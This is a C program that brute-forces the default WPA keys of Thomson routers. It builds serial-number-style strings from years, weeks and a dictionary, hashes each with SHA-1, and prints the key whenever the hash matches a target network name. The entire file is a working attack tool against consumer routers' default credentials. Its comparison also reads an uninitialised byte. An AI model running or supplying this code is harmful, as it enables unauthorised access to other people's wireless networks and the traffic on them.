/*
 * main.c
 *
 *  Created on: 2010/06/07
 *      Author: ruka
 */
 
#include <ctype.h>
#include <time.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include "unknown.h"
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <omp.h>
#include <ctype.h>

#ifdef __unix__
#include <sys/times.h>
#include <unistd.h>
#endif

#define ESSID 0xF85B17
#define BEGIN_YEAR 4
#define FINAL_YEAR 10

int validInput( char * input )
{
  int i = 0;
  if ( input[0] == '0' &&  ( input[1] == 'x' ||input[1] == 'X')  )
    input += 2;
  int n = strlen( input );
  if ( n > 6 )
    return 0;

  for ( ;  i < n ; ++i)
    if ( !isxdigit( input[i] ) )
      return 0;
  return 1;
}

int main( int argc  , char * argv[] )
{
    int n = sizeof(dic)/sizeof("AAA");
    uint32_t essid = 0;
#ifdef __unix__
    struct tms t;
    clock_t start, end;
    long ticks;
    ticks = sysconf(_SC_CLK_TCK);
#endif
    if ( argc > 1 )
    {
      if ( validInput(argv[1] ) != 0 )
        essid = (uint32_t)strtol(argv[1] , NULL , 16);
      else
        printf("Error when parsing: %s! "
                "Please only insert the hexadecimal part!\n" , argv[1]);
    }
    if ( essid == 0 )
    {
        essid = ESSID;
        printf("Warning: Using default essid - 0x%X\n" , essid);
    }
#ifdef __unix__
    start = times(&t);
#endif
    #pragma omp parallel
    {
        uint8_t message_digest[20];
        SHA_CTX sha1;
        int year = BEGIN_YEAR;
        int week = 1;
        int i = 0 ;
        char unknown[7]= "123456";
        char input[13];
        input[0] = 'C';
        input[1] = 'P';
        uint32_t * ptr = (uint32_t *)malloc(sizeof(uint32_t));
        #pragma omp for
        for( i = 0 ; i < n; ++i  )
        {
            sprintf( unknown , "%02X%02X%02X" , (int)dic[i][0]
                                    , (int)dic[i][1], (int)dic[i][2] );        
            for ( year = BEGIN_YEAR ; year <= FINAL_YEAR ; ++year )
            {
                for ( week = 1 ; week <= 52 ; ++week )
                {
                    input[2] = '0' + year/10;
                    input[3] = '0' + year % 10 ;
                    input[4] = '0' + week / 10;
                    input[5] = '0' + week % 10;
                    strcpy( input + 6 , unknown);
                    SHA1_Init(&sha1);
                    SHA1_Update(&sha1 ,(const void *) input , 12 );
                    SHA1_Final(message_digest , &sha1 );
                    /*
                    * Had to copy the result backwards to match the corret response
                    * No idea why.. But heard about it in some forum...
                    */
                    memcpy(((uint8_t *)ptr) , message_digest + 19 , 1);
                    memcpy(((uint8_t *)ptr) + 1, message_digest + 18 , 1);
                    memcpy(((uint8_t *)ptr) + 2, message_digest + 17 , 1);

                    if ( (*ptr) == essid )
                    {
                        printf( "Possibility: Year - %d\tWeek: %d\n", 2000+year,  week );
                        printf("ESSID: Thomson%02X%02X%02X\t" , message_digest[17] ,
                                         message_digest[18] , message_digest[19]);
                        printf("KEY: %02X%02X%02X%02X%02X\n" , message_digest[0], message_digest[1] , 
                                        message_digest[2] , message_digest[3], message_digest[4] );
                    }


                }
            }
        }
    }
#ifdef __unix__
    end = times(&t);                            /* fim da medição de tempo */
    printf("Clock:           %4.4f s\n", (double)(end-start)/ticks);
    printf("User time:       %4.4f s\n", (double)t.tms_utime/ticks);
    printf("System time:     %4.4f s\n", (double)t.tms_stime/ticks);
#endif
    return 0;
}
